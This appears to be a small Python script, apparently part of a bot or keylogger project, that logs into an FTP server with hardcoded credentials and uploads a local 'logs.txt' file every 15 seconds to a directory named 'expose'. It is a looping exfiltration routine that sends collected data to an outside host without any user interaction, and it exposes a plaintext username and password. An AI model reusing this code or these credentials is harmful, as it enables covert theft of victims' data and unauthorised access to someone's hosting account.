import ftplib
from ftplib import FTP
import os
import time
import threading

def FTP():
            threading.Timer(15.0, FTP).start()
            filename = "logs.txt"
            ftp = ftplib.FTP("ftp.byethost15.com")
            ftp.login("b15_17022956", "kurwa456")
            ftp.cwd("/htdocs/expose/")
            os.chdir(r"F:\Bot-master")
            myfile = open(filename, 'rb')
            ftp.storbinary('STOR ' + filename, myfile)
            myfile.close()
            
FTP()

